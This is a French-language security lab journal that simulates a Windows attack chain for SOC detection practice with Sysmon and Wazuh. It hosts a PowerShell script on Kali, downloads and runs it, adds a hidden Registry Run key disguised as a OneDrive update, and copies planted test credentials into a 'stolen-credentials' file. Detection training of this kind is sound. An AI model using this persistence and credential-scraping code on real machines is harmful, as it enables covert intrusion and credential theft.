# JOUR 3 - Scénario d'attaque Windows : de l'exécution au Credential Access

## Objectif du jour

Lors des deux premiers jours, j'ai préparé la télémétrie de mon environnement.

Le **Jour 1** m'a permis d'enrichir mon endpoint Windows 11 avec **Sysmon** et de faire remonter ses événements vers Wazuh.  
Le **Jour 2** m'a permis de faire la même chose sur mon serveur Debian avec **auditd, SSH, Apache et le FIM**.

Je vais maintenant commencer la partie la plus importante du projet : **simuler une attaque et observer les traces qu'elle produit**.

L'idée est de ne plus seulement générer des événements avec `notepad.exe` ou `curl`, mais de reproduire une véritable chaîne d'attaque contrôlée.

Le scénario que je vais réaliser aujourd'hui correspond à la première partie de l'attaque :

```text
KALI
  │
  │ Hébergement du script
  ▼
WINDOWS 11
  │
  ├── Exécution du script
  │
  ├── Persistance
  │      └── Registry Run Key
  │
  └── Credential Access simulé
         └── Credentials In Files
```

La partie suivante, qui sera réalisée au **Jour 4**, sera :

```text
WINDOWS
   │
   │ Identifiants récupérés
   ▼
SSH
   │
   ▼
DEBIAN
   │
   ├── Élévation de privilèges
   └── Modification Apache
```

---

# 1. Correspondance avec MITRE ATT&CK

Je vais volontairement utiliser plusieurs techniques MITRE ATT&CK pour pouvoir ensuite analyser mon attaque avec cette grille de lecture.

| Étape du scénario | MITRE ATT&CK | Ce que je simule |
|---|---|---|
| Exécution du fichier | T1204.002 | User Execution: Malicious File |
| Exécution PowerShell | T1059.001 | PowerShell |
| Persistance | T1547.001 | Registry Run Keys / Startup Folder |
| Récupération d'identifiants | T1552.001 | Credentials In Files |

MITRE décrit T1204.002 comme l'utilisation d'un fichier que l'utilisateur ouvre ou exécute afin de permettre l'exécution de code.

Pour la persistance, MITRE indique que les clés `Run` et `RunOnce` peuvent permettre l'exécution automatique d'un programme lors de la connexion d'un utilisateur.

Enfin, T1552.001 correspond à la recherche d'informations d'authentification stockées de manière non sécurisée dans des fichiers ou configurations.

---

# 2. Préparer mon environnement

Avant de commencer, je vérifie que mes trois machines sont disponibles :

```text
Kali Linux
Windows 11
Debian
```

Aujourd'hui, je vais principalement travailler entre :

```text
KALI
   ↕
WINDOWS
```

Je n'utilise pas encore Debian pour le mouvement latéral. Cette partie viendra demain.

---

# 3. Vérifier les adresses IP

## 3.1 Sur Kali

Je commence par récupérer l'adresse IP de ma machine Kali :

```bash
ip addr
```

ou :

```bash
hostname -I
```

Je relève l'adresse IP de l'interface connectée à mon réseau de lab.

Par exemple :

```text
KALI_IP = 192.168.56.20
```

Je vais conserver cette valeur, car Windows devra pouvoir joindre le serveur HTTP que je vais lancer sur Kali.

---

## 3.2 Sur Windows

Sur mon Windows 11, je vérifie mon adresse IP :

```powershell
ipconfig
```

Je relève également l'adresse IP :

```text
WINDOWS_IP = 192.168.56.10
```

Je peux tester la communication avec Kali :

```powershell
ping KALI_IP
```

L'objectif ici n'est pas encore de faire une attaque, mais simplement de vérifier que les deux machines peuvent communiquer.

---

# 4. Préparer le « poste utilisateur » Windows

Dans une entreprise, l'un des problèmes classiques est de retrouver des informations sensibles stockées dans des fichiers locaux.

Pour ce lab, je vais donc **créer volontairement un fichier de test contenant de faux identifiants**.

Cela va nous permettre de simuler la technique :

```text
T1552.001 — Credentials In Files
```

Je crée d'abord le dossier :

```powershell
New-Item `
  -ItemType Directory `
  -Path "C:\Users\Public\Documents\SOC-Lab" `
  -Force
```

Puis je crée un fichier de configuration fictif :

```powershell
@'
application=internal-intranet
username=labops
password=Lab-SOC-2026!
server=DEBIAN_IP
protocol=ssh
'@ | Set-Content `
  "C:\Users\Public\Documents\SOC-Lab\deployment-notes.txt"
```

Je remplace bien :

```text
DEBIAN_IP
```

par l'adresse IP réelle de mon serveur Debian.

---

# 5. Vérifier le fichier contenant les identifiants de test

Je vérifie que le fichier a bien été créé :

```powershell
Get-Item `
  "C:\Users\Public\Documents\SOC-Lab\deployment-notes.txt"
```

Puis :

```powershell
Get-Content `
  "C:\Users\Public\Documents\SOC-Lab\deployment-notes.txt"
```

Je dois retrouver quelque chose ressemblant à :

```text
application=internal-intranet
username=labops
password=Lab-SOC-2026!
server=192.168.56.30
protocol=ssh
```

Ce fichier représente ici une mauvaise pratique de stockage des identifiants.

**Important :** le mot de passe utilisé est uniquement un mot de passe de laboratoire. Il ne doit correspondre à aucun compte réel.

---

# 6. Préparer Kali comme machine attaquante

Je vais maintenant passer sur Kali Linux.

L'objectif est de simuler un attaquant qui héberge un fichier destiné à être exécuté sur le poste Windows.

Je crée un dossier de travail :

```bash
mkdir -p ~/SOC-Lab/day3/payload
cd ~/SOC-Lab/day3/payload
```

Je vérifie :

```bash
pwd
```

Je dois obtenir quelque chose comme :

```text
/home/kali/SOC-Lab/day3/payload
```

---

# 7. Créer le script de simulation

Je vais créer un script PowerShell représentant le « fichier malveillant ».

Dans la réalité, le contenu pourrait être malveillant. Dans mon laboratoire, je vais volontairement utiliser un script **inoffensif**, mais qui produit des traces proches de celles que je veux étudier.

Je crée le fichier :

```bash
nano invoice_update.ps1
```

J'y place :

```powershell
$LabRoot = "C:\ProgramData\SOC-Lab"
$StageDir = "$LabRoot\Stage"

New-Item -ItemType Directory -Force -Path $StageDir | Out-Null

# Marqueur d'exécution
"DAY3_EXECUTION=$(Get-Date -Format o)" |
    Out-File "$StageDir\execution-marker.txt" `
    -Encoding utf8

Write-Host "SOC LAB - controlled execution"

# Préparation d'un second script pour simuler la persistance
@'
$LabRoot = "C:\ProgramData\SOC-Lab"
"DAY3_PERSISTENCE=$(Get-Date -Format o)" |
    Out-File "$LabRoot\Stage\persistence-marker.txt" `
    -Append `
    -Encoding utf8
'@ | Set-Content `
    "$StageDir\persistence.ps1" `
    -Encoding utf8

# Création de la persistance via une Registry Run Key
$RunCommand = "powershell.exe -NoProfile -WindowStyle Hidden -File `"C:\ProgramData\SOC-Lab\Stage\persistence.ps1`""

New-ItemProperty `
    -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "OneDriveUpdateLab" `
    -Value $RunCommand `
    -PropertyType String `
    -Force | Out-Null

# Simulation de Credential Access
$CredentialFile = "C:\Users\Public\Documents\SOC-Lab\deployment-notes.txt"

if (Test-Path $CredentialFile) {

    $Content = Get-Content $CredentialFile

    $Username = (
        $Content |
        Where-Object { $_ -match '^username=' } |
        Select-Object -First 1
    ) -replace '^username=', ''

    $Password = (
        $Content |
        Where-Object { $_ -match '^password=' } |
        Select-Object -First 1
    ) -replace '^password=', ''

    @"
username=$Username
password=$Password
retrieved=$(Get-Date -Format o)
"@ | Set-Content `
    "$LabRoot\Stage\stolen-credentials.txt" `
    -Encoding utf8
}
```

Je sauvegarde puis je vérifie le contenu :

```bash
cat invoice_update.ps1
```

---

# 8. Comprendre ce que fait réellement mon script

Avant de l'exécuter, je prends le temps de comprendre ce qu'il va produire.

Le script va faire quatre choses principales :

```text
1. Créer un marqueur d'exécution
             ↓
2. Créer un second script
             ↓
3. Ajouter une Registry Run Key
             ↓
4. Lire un fichier contenant des identifiants fictifs
```

Je cherche donc à produire une chaîne d'événements intéressante :

```text
PowerShell
   ↓
Process Creation
   ↓
File Creation
   ↓
Registry Modification
   ↓
File Access
```

C'est exactement le type de chaîne que nous allons ensuite essayer de détecter.

MITRE recommande notamment de corréler une modification des Run Keys avec une création de processus ou un chemin de script inhabituel pour améliorer la détection de cette technique.

---

# 9. Vérifier le fichier depuis Kali

Avant de lancer le serveur HTTP :

```bash
ls -lh
```

Je dois voir :

```text
invoice_update.ps1
```

Puis :

```bash
sha256sum invoice_update.ps1
```

Je note le hash.

Cela me permettra plus tard de documenter précisément le fichier utilisé dans mon incident report.

---

# 10. Héberger le script depuis Kali

Je vais maintenant simuler le fait que l'attaquant met un fichier à disposition du poste Windows.

Depuis Kali :

```bash
cd ~/SOC-Lab/day3/payload
```

Puis :

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

Je dois obtenir quelque chose ressemblant à :

```text
Serving HTTP on 0.0.0.0 port 8000
```

Le serveur HTTP reste ouvert.

Je le laisse tourner pendant le test.

---

# 11. Vérifier depuis Windows que le fichier est accessible

Je retourne sur Windows.

Je peux tester :

```powershell
Invoke-WebRequest `
  -Uri "http://KALI_IP:8000/invoice_update.ps1" `
  -Method Head
```

Je dois obtenir une réponse HTTP indiquant que le fichier existe.

Je peux également tester :

```powershell
Test-NetConnection KALI_IP -Port 8000
```

Je cherche :

```text
TcpTestSucceeded : True
```

À ce stade :

```text
Kali
  ↓
HTTP : 8000
  ↓
Windows
```

---

# 12. Simuler l'arrivée du fichier malveillant

Dans une attaque réelle, le fichier pourrait arriver par différents moyens : pièce jointe, téléchargement Web, partage de fichiers, etc.

Dans mon lab, je vais simplifier cette étape en simulant directement le téléchargement du fichier depuis Kali.

Sur Windows :

```powershell
Invoke-WebRequest `
  -Uri "http://KALI_IP:8000/invoice_update.ps1" `
  -OutFile "$env:TEMP\invoice_update.ps1"
```

Je vérifie :

```powershell
Get-Item "$env:TEMP\invoice_update.ps1"
```

Puis :

```powershell
Get-FileHash `
  "$env:TEMP\invoice_update.ps1" `
  -Algorithm SHA256
```

Le hash doit correspondre à celui que j'ai obtenu sur Kali.

---

# 13. Vérifier ce que Sysmon a déjà observé

Avant même d'exécuter le fichier, je peux regarder les événements Sysmon.

Je recherche les créations de fichiers :

```powershell
Get-WinEvent `
  -LogName "Microsoft-Windows-Sysmon/Operational" `
  -MaxEvents 100 |
  Where-Object Id -eq 11 |
  Select-Object -First 20 TimeCreated, Id, Message
```

Je cherche notamment :

```text
invoice_update.ps1
```

Cela me permet de constater qu'une simple phase de dépôt de fichier peut déjà laisser une trace.

---

# 14. Exécuter le script

Je passe maintenant à l'exécution.

```powershell
powershell.exe `
  -NoProfile `
  -File "$env:TEMP\invoice_update.ps1"
```

Je dois voir :

```text
SOC LAB - controlled execution


```

Le script est maintenant exécuté sur le poste Windows.

---

# 15. Observer immédiatement les événements Sysmon

Je vais maintenant vérifier ce que cette action a produit.

## 15.1 Event ID 1 - Process Creation

```powershell
Get-WinEvent `
  -LogName "Microsoft-Windows-Sysmon/Operational" `
  -MaxEvents 100 |
  Where-Object Id -eq 1 |
  Select-Object -First 20 TimeCreated, Id, Message
```

Je vais chercher :

```text
powershell.exe
```

et surtout :

```text
CommandLine
ParentImage
User
Image
```

---

## 15.2 Event ID 11 - File Creation

```powershell
Get-WinEvent `
  -LogName "Microsoft-Windows-Sysmon/Operational" `
  -MaxEvents 100 |
  Where-Object Id -eq 11 |
  Select-Object -First 20 TimeCreated, Id, Message
```

Je cherche notamment :

```text
C:\ProgramData\SOC-Lab\Stage\
```

et :

```text
persistence.ps1
```

---

# 16. Observer la persistance

Le script vient maintenant de modifier :

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Je vérifie directement la clé :

```powershell
Get-ItemProperty `
  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```

Je cherche :

```text
OneDriveUpdateLab
```

avec une valeur ressemblant à :

```text
powershell.exe -NoProfile -WindowStyle Hidden ...
```

La persistance que je viens de créer correspond à **T1547.001 — Registry Run Keys / Startup Folder**. MITRE confirme que les valeurs de ces clés sont exécutées lors de la connexion de l'utilisateur.

---

# 17. Chercher l'événement Sysmon de modification du registre

Je peux maintenant rechercher :

```powershell
Get-WinEvent `
  -LogName "Microsoft-Windows-Sysmon/Operational" `
  -MaxEvents 100 |
  Where-Object Id -eq 13 |
  Select-Object -First 20 TimeCreated, Id, Message
```

Je cherche :

```text
CurrentVersion\Run
```

et :

```text
OneDriveUpdateLab
```

C'est une des traces les plus importantes du jour.

La détection moderne des Run Keys repose justement sur la combinaison de modifications du registre et d'activité de processus/fichiers. MITRE associe notamment l'Event ID 13 de Sysmon aux modifications de valeurs du registre dans sa stratégie de détection.

---

# 18. Observer le Credential Access simulé

Le script a maintenant recherché :

```text
C:\Users\Public\Documents\SOC-Lab\deployment-notes.txt
```

et créé :

```text
C:\ProgramData\SOC-Lab\Stage\stolen-credentials.txt
```

Je vérifie :

```powershell
Get-Content `
  "C:\ProgramData\SOC-Lab\Stage\stolen-credentials.txt"
```

Je dois retrouver :

```text
username=labops
password=Lab-SOC-2026!
retrieved=...
```

L'objectif est ici de simuler :

```text
Recherche d'un fichier contenant un secret
              ↓
       récupération
              ↓
   utilisation future
```

Cela correspond à **T1552.001 - Credentials In Files**, que MITRE définit comme la recherche d'identifiants stockés de manière non sécurisée dans des fichiers, des configurations ou d'autres emplacements locaux.

---

# 19. Ce que je viens de simuler

À ce stade, mon attaque Windows peut être résumée ainsi :

```text
KALI
 │
 │ HTTP
 ▼
WINDOWS
 │
 ├── Téléchargement du script
 │
 ├── PowerShell
 │
 ├── Création de fichiers
 │
 ├── Registry Run Key
 │
 └── Lecture d'un fichier contenant des identifiants fictifs
        │
        ▼
stolen-credentials.txt
```

Correspondance MITRE :

```text
T1204.002
User Execution: Malicious File
        ↓
T1059.001
PowerShell
        ↓
T1547.001
Registry Run Keys
        ↓
T1552.001
Credentials In Files
```

---

# 20. Vérifier toute la chaîne dans Wazuh

Maintenant que les événements sont générés localement, je retourne dans **Wazuh Dashboard**.

<br>

<img width="1877" height="922" alt="image" src="https://github.com/user-attachments/assets/03eeb072-26ae-434a-93be-8793cb366c0c" />


---

# Conclusion

Pour cette troisième journée, je commence réellement à utiliser mon environnement comme un laboratoire d'attaque.

Je suis parti de **Kali Linux**, qui joue le rôle de l'attaquant, afin d'héberger un script PowerShell de simulation.

J'ai ensuite simulé son arrivée sur le poste Windows 11 et son exécution avec PowerShell.

Le script a créé plusieurs artefacts permettant de reproduire une chaîne d'attaque réaliste : création de fichiers, persistance via une **Registry Run Key** et recherche d'identifiants fictifs stockés dans un fichier local.
